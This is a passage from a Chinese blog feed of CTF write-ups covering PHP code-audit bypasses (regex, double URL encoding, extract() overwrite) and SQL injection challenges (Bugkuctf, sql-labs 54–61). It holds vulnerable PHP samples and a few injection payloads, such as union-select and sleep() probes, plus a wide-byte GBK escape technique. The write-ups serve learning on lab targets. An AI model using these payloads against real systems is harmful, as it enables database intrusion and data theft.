&apos;Wrong Format 1&apos;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">    $reg = &apos;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&apos;;</span><br><span class="line">    if(6&gt;preg_match_all($reg,$password,$arr))&#123;</span><br><span class="line">        echo &apos;Wrong Format 2&apos;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $c=0;</span><br><span class="line">    $ps=array(&apos;punct&apos;,&apos;digit&apos;,&apos;upper&apos;,&apos;lower&apos;);</span><br><span class="line">    foreach($ps as $pt)&#123;</span><br><span class="line">        if(preg_match(&quot;/[[:$pt:]]+/&quot;,$password))&#123;</span><br><span class="line">            $c += 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if($c&lt;3)&#123;</span><br><span class="line">        echo &apos;Wrong Format 3&apos;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &apos;success&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/数字验证正则绕过/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>再看最后一个关键条件： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(&quot;42&quot; == $password) echo $flag;</span><br></pre></td></tr></table></figure><p>执行了这个语句我们才可以得到想要的flag，也就是password值等于’42’，因为类型都是字符串，所以password中的值必须等于42，结合上面的三个条件</p><p>成功的输入可以有：</p><p>42.000e%2b000000000</p><p>420.000000000000e-1</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/数字验证正则绕过/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/数字验证正则绕过/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure>]]></content>
    
    <summary type="html">
    
      代码审计
    
    </summary>
    
      <category term="代码审计" scheme="https://Foxgrin.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="php" scheme="https://Foxgrin.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>url二次编码绕过</title>
    <link href="https://Foxgrin.github.io//posts/9338/"/>
    <id>https://Foxgrin.github.io//posts/9338/</id>
    <published>2018-07-10T12:10:00.000Z</published>
    <updated>2018-07-10T12:17:46.498Z</updated>
    
    <content type="html"><![CDATA[<p>Bugkuctf题库中的一道代码审计题，通过url二次编码绕过过滤得到flag<a id="more"></a></p><p>源代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$flag=<span class="string">'flag&#123;xxxx&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/hackerDJ/"</span>,$_GET[<span class="string">'id'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"not allowed"</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$id=urldecode($id);</span><br><span class="line"><span class="keyword">if</span>(<span class="string">"hackerDJ"</span> == $id)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看代码第一感觉将hackerDJ进行一次URL编码即可绕过过滤 </p><p><img src="/img/url二次编码绕过/1.png" alt=""></p><p>将一次编码后的值输入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/url二次编码绕过/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现自动转化成了hackerDJ，为什么呢，因为我们提交id值给服务器时，服务器会对id值自动url解码，所以要对hackerDJ进行二次URL编码才可以绕过 </p><p><img src="/img/url二次编码绕过/3.png" alt=""></p><p>输入二次编码后的值</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/url二次编码绕过/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功得到flag值</p>]]></content>
    
    <summary type="html">
    
      代码审计
    
    </summary>
    
      <category term="代码审计" scheme="https://Foxgrin.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="php" scheme="https://Foxgrin.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>extract变量覆盖</title>
    <link href="https://Foxgrin.github.io//posts/25619/"/>
    <id>https://Foxgrin.github.io//posts/25619/</id>
    <published>2018-07-10T11:37:00.000Z</published>
    <updated>2018-07-10T12:04:55.616Z</updated>
    
    <content type="html"><![CDATA[<p>Bugkuctf题库中的一道代码审计题，通过巧妙利用file_get_contents函数特性来绕过extract变量覆盖<a id="more"></a></p><p>源代码如下： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$flag=&apos;../readme.txt&apos;;</span><br><span class="line"></span><br><span class="line">extract($_GET);</span><br><span class="line">if(isset($shiyan))&#123;</span><br><span class="line">    @$content=trim(file_get_contents($flag));</span><br><span class="line">    if($shiyan == $content)&#123;</span><br><span class="line">        echo &apos;flag&#123;xxx&#125;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo &apos;oh,no&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>首先先弄明白几个函数：</p><p>extract:该函数将数组的键名作为变量名，键名对应的键值作为对应的变量值，返回值为设置成功的变量个数</p><p>也就是说这里的extract($_GET)将我们GET的参数名作为变量名，参数值作为变量值</p><p>例子如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;shiyan&apos;]) $$ isset($_GET[&apos;flag&apos;]))&#123;</span><br><span class="line">    $a=extract($_GET);</span><br><span class="line">    echo &apos;$a:&apos;.$a;</span><br><span class="line">    echo &apos;&lt;br&gt;&apos;;</span><br><span class="line">    echo &apos;$shiyan:&apos;.$shiyan;</span><br><span class="line">    echo &apos;&lt;br&gt;&apos;;</span><br><span class="line">    echo &apos;$flag:&apos;.$flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/extract变量覆盖/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功设置了两个变量，$shiyan和$flag，所以$a=2</p><p>file_get_contents：将文件内容作为字符串输出 </p><p>例子如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$flag=&apos;../readme.txt&apos;;</span><br><span class="line">$content=file_get_contents($flag);</span><br><span class="line">echo $content;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/extract变量覆盖/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这里注意file_get_contents函数里的参数是$flag，也就是说我们GET进来的参数flag值会将之前的flag值覆盖掉，从而造成变量覆盖，而我们输入的flag值如果不为文件名，函数执行错误，$content会被赋值为空 </p><p>例子如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$flag=&apos;../readme.txt&apos;;</span><br><span class="line">if(isset($_GET[&apos;flag&apos;]))&#123;</span><br><span class="line">    extract($_GET);</span><br><span class="line">    @$content=file_get_contents($flag);</span><br><span class="line">    echo $content.&apos;1&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/extract变量覆盖/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>要得到最终要的flag，就必须要让变量content值等于变量shiyan的值</p><p>所以我们可以让shiyan值也为空，这样flag值任意输入，只要不为文件名，就一定相等</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/extract变量覆盖/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>另外，即使shiyan值为空，isset($shiyan)也是返回true的 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$shiyan=&quot;&quot;;</span><br><span class="line">if(isset($shiyan))&#123;</span><br><span class="line">    echo &quot;11&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/extract变量覆盖/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure>]]></content>
    
    <summary type="html">
    
      代码审计
    
    </summary>
    
      <category term="代码审计" scheme="https://Foxgrin.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="php" scheme="https://Foxgrin.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>Bugkuctf-sql注入2</title>
    <link href="https://Foxgrin.github.io//posts/15184/"/>
    <id>https://Foxgrin.github.io//posts/15184/</id>
    <published>2018-07-10T11:19:00.000Z</published>
    <updated>2018-07-10T12:25:05.822Z</updated>
    
    <content type="html"><![CDATA[<p>Bugkuctf题库中的sql注入类题<a id="more"></a></p><p>今天继续做web类的题 </p><p><img src="/img/bugkuctf-sql2/1.png" alt=""></p><p>从题目给出的一段代码，查询各个函数的作用</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bugkuctf-sql2/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bugkuctf-sql2/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bugkuctf-sql2/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看出，这段PHP程序过滤了数组里的关键字，且对我们输入的id的值进行了标签的剥离。一开始还不懂什么意思，没事我们来试一下就慢慢懂了</p><p>跟个注入题一样，输入id值为0,1时有返回值，其他无返回值</p><p>试试id=1’,id=1”,id=1’),id=1”)发现都未返回报错信息</p><p>就用基于时间的盲注试一下</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bugkuctf-sql2/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>咦，这时候居然爆出了这么一段话，再回头看看之前查询的函数，原来我们输入的id值中包含了数组中的敏感关键字，所以爆出了这段话，再看看strip_tags()这个函数，它能剥离输入字符串中的html标签，那我们试试，在敏感关键字中的出现位置加入&lt;&gt;标签 </p><p><img src="/img/bugkuctf-sql2/6.png" alt=""></p><p>果然就没有爆出之前的那段话了，又因为网页没有睡5秒，所以再试试id=1 </p><p><img src="/img/bugkuctf-sql2/7.png" alt=""></p><p>发现程序睡了5秒，说明没有对输入的id的值进行单引号或者双引号的包裹</p><p>再查查输出的列数</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bugkuctf-sql2/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现返回两列，于是接下来就是熟悉的注入 </p><p><img src="/img/bugkuctf-sql2/9.png" alt=""></p><p>爆出当前使用的数据库为sql3 </p><p><img src="/img/bugkuctf-sql2/10.png" alt=""></p><p>爆出它的数据表 </p><p><img src="/img/bugkuctf-sql2/11.png" alt=""></p><p>根据题目提示爆出id=1的hash字段值 </p>]]></content>
    
    <summary type="html">
    
      Bugkuctf-sql
    
    </summary>
    
      <category term="Bugkuctf-sql" scheme="https://Foxgrin.github.io/categories/Bugkuctf-sql/"/>
    
    
      <category term="sql" scheme="https://Foxgrin.github.io/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>Bugkuctf-sql注入1</title>
    <link href="https://Foxgrin.github.io//posts/14864/"/>
    <id>https://Foxgrin.github.io//posts/14864/</id>
    <published>2018-07-10T11:10:00.000Z</published>
    <updated>2018-07-10T12:25:11.257Z</updated>
    
    <content type="html"><![CDATA[<p>Bugkuctf题库中的sql注入类题<a id="more"></a></p><p>今天试着开始做一些ctf的题目，因为最近刚好在学渗透，所以试着做了一下web类，做到一题sql注入题，按照之前学习的盲注方法，一开始先用/?id=1 </p><p><img src="/img/bugkuctf-sql1/1.png" alt=""></p><p>紧接着再试着改变id的值，发现除了0,1返回结果都为空，就判断id为注入的变量</p><p>感觉节奏很好，便在/?id=1后面加了’，结果按照之前的经验会报错，然而这题的结果却是与之前没加引号的结果相同</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bugkuctf-sql1/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>在试着用 /?id=2’ union select 1,database() %23按照之前的经验会注出数据库的名字 </p><p><img src="/img/bugkuctf-sql1/3.png" alt=""></p><p>然而结果依然为空…</p><p>/?id=1’ and if(0&gt;1,1,sleep(5)) %23 会让程序睡5秒</p><p>然而结果并没有</p><p>通过查阅发现，原来这是一个有防御的php程序，使用了一个addslashed()函数，这个函数的作用是对用户输入的预定义字符前面加入转义字符‘\’进行转义</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bugkuctf-sql1/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>执行这个php程序 </p><p><img src="/img/bugkuctf-sql1/5.png" alt=""></p><p>可见当我们输入’后，经过addslashed()函数将’转化成\’，就不再是一个单引号，从而避免了一般的注入，所以便产生了宽字节注入，其原理是当mysql使用gbk编码方式时，会将前两个字符看成一个汉字（当第一个字符ascii码大于128时（比如$df），才会达到汉字的范围），当我们输入单引号’时，mysql会调用转义函数将单引号变为\’，其中\的十六进制是%5c，mysql的GBK编码，会认为%df%5c是一个宽字节，也就是’ 運’，从而使单引号闭合（逃逸），进行注入攻击</p><p>当mysql接受客户端的数据后，会认为它的编码是character_set_client，然后将之转换成character_set_connection的编码，然后进入具体表和字段后，在转换成字段响应的编码，当查询结果产生后，会从表和字段的编码转换成character_set_results编码，返回给客户端</p><p>于是我们开始使用宽字节注入，发现开始报错了</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bugkuctf-sql1/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>爆一下查询字段数量，发现是2 </p><p><img src="/img/bugkuctf-sql1/7.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bugkuctf-sql1/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>爆数据库，发现数据库名为sql5 </p><p><img src="/img/bugkuctf-sql1/9.png" alt=""></p><p>爆数据表，发现有key和test两个数据表 </p><p><img src="/img/bugkuctf-sql1/10.png" alt=""></p><p>接下来爆列 </p><p><img src="/img/bugkuctf-sql1/11.png" alt=""></p><p>可以发现出现了问题，原来是mysql中的转义函数将’test’的两个单引号前面都加了\进行转义</p><p>因为题目有提示在key表的string字段下，于是查询</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bugkuctf-sql1/12.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现又出现了错误，查询后发现在用<code>key</code>替换key,或者用sql5.key，才能查询到结果 </p><p><img src="/img/bugkuctf-sql1/13.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      Bugkuctf-sql
    
    </summary>
    
      <category term="Bugkuctf-sql" scheme="https://Foxgrin.github.io/categories/Bugkuctf-sql/"/>
    
    
      <category term="sql" scheme="https://Foxgrin.github.io/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>sql-labs54-61</title>
    <link href="https://Foxgrin.github.io//posts/58593/"/>
    <id>https://Foxgrin.github.io//posts/58593/</id>
    <published>2018-07-09T17:49:00.000Z</published>
    <updated>2018-07-10T08:31:49.435Z</updated>
    
    <content type="html"><![CDATA[<p>总结了sql-labs的一些挑战关卡<a id="more"></a></p><h2 id="Less54-61"><a href="#Less54-61" class="headerlink" title="Less54-61"></a>Less54-61</h2><h3 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h3><p>这里开始进入挑战关卡，明显比前面难度提升了很多</p><p>直接看源代码吧</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>首先导入两个php文件</p><p>先看看sql-connect-1.php</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>连接mysql数据库，选择challenges这个数据库</p><p>再看看functions.php</p><p>里面定义了一堆函数，后面会一个个用到，我们先放着继续看下面的代码</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这句代码将php文件的路径取了出来，我们把$pag值输出到文件看看 </p><p><img src="/img/sql-labs54-61/4.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>继续看下面 </p><p><img src="/img/sql-labs54-61/6.png" alt=""></p><p>利用到functions里面的函数了，看看table_name这个函数 </p><p><img src="/img/sql-labs54-61/7.png" alt=""></p><p>在mysql命令行输入 </p><p><img src="/img/sql-labs54-61/8.png" alt=""></p><p>将取到的表名赋值给$table </p><p><img src="/img/sql-labs54-61/9.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/12.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>将取得的两个列名分别赋值给两个变量 </p><p>接着来到判断语句 </p><p><img src="/img/sql-labs54-61/13.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/14.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>当我们一开始还没有点击提交和重置按钮时 </p><p><img src="/img/sql-labs54-61/15.png" alt=""></p><p>来到else语句，然后一开始cookie字段中没有challenge值</p><p>执行data函数</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/16.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/17.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>返回sessid值</p><p>然后设置cookie值</p><p>然后需要我们get传入id值，输入id值后</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/18.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>执行这个函数 </p><p><img src="/img/sql-labs54-61/19.png" alt=""></p><p>一开始时tryy值为0 </p><p><img src="/img/sql-labs54-61/20.png" alt=""></p><p>可见这个tryy值就是我们输入id的次数</p><p>当我们输入Id的次数大于10时，就执行</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/21.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>删除cookie中challenge字段值</p><p>并且重定向到另一个php文件同时get一个id值，值为</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/22.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>而这个php就是检测如果不存在challenges数据库的话就建立challenges这个数据库 ，并建立一个表，这个表的表名是随机的，见如下代码 </p><p><img src="/img/sql-labs54-61/23.png" alt=""></p><p>并往这个表中添加数据 </p><p><img src="/img/sql-labs54-61/24.png" alt=""></p><p>当我们post key值后点击提交按钮</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/25.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>则进行一个判断的sql语句</p><p>如果我们post值在col1列中，则返回1，否则不返回</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/26.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>然后成功提交key后，重定向到建立表的php，重新建立challenges表</p><p>也就是说，这关整体思路就是利用id值进行注入，有10次尝试的机会，一开始已经告诉我们表名是challenges，要在表中拿到key值</p><p>那么我们开始注入</p><p>首先一开始仍然是判断id有没有被引号包裹</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/27.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现被单引号包裹，那么接下来判断返回列数 </p><p><img src="/img/sql-labs54-61/28.png" alt=""></p><p>返回3列</p><p>那就可以联合注入了</p><p>爆数据库</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/29.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>爆表</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/30.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>爆列</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/31.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>我们要找的key应该是在第三个列 </p><p><img src="/img/sql-labs54-61/32.png" alt=""></p><p>最后报出key，提交 </p><p><img src="/img/sql-labs54-61/33.png" alt=""></p><h3 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h3><p>这里没有报错信息，id被()包裹，尝试次数为14次，其他和之前关卡没有什么区别 </p><p><img src="/img/sql-labs54-61/34.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/35.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h3><p>Id被(‘’)包裹，剩下的跟之前关卡一样 </p><p><img src="/img/sql-labs54-61/36.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/37.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/38.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h3><p>Id被””包裹，剩下的和之前一样 </p><p><img src="/img/sql-labs54-61/39.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/40.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/41.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/42.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h3><p>这关输入id值发现并没有返回正确信息，而且这里尝试次数仅为5次</p><p>看一下源代码</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/43.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这里定义了一个数组，并且将用了一个数组顺序反转的函数array_reverse()</p><p>写个test测试一下</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/44.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/45.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>如果是关联数组 </p><p><img src="/img/sql-labs54-61/46.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/47.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>然后根据我们输入的id值进行mysql查询，将查询结果的id值作为数组的索引</p><p>所以输出一定是数组里的内容，不可能得到我们想要的信息，但是这里有报错信息显示，所以我们可以考虑用报错注入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/48.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/49.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/50.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/51.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h3><p>这里id没有被引号包裹，其他跟之前一样 </p><p><img src="/img/sql-labs54-61/52.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/53.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/54.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/55.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h3><p>Id被（“”）包裹，其他跟之前一样 </p><p><img src="/img/sql-labs54-61/56.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/57.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/58.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/59.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h3><p>这关id被((‘’))包裹，其他跟之前一样 </p><p><img src="/img/sql-labs54-61/60.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img 